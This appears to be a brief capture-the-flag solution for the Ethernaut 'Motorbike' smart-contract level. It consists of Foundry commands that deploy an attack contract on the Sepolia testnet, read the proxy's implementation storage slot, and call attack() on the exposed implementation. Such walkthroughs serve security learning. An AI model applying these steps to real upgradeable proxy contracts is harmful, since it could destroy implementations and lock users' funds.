# Motorbike Solution

Deploy `MotorbikeHack`:

```
forge create MotorbikeHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args `ìnstanceAddress`
```

Retrieve the `implementationAddress`:

```
cast storage `ìnstanceAddress` 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $SEPOLIA_RPC_URL
```

Truncate the first 24 zeros and call the `attack()` function:

```
cast send `motorbikeHackAddress` "attack(address)" `implementationAddress` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
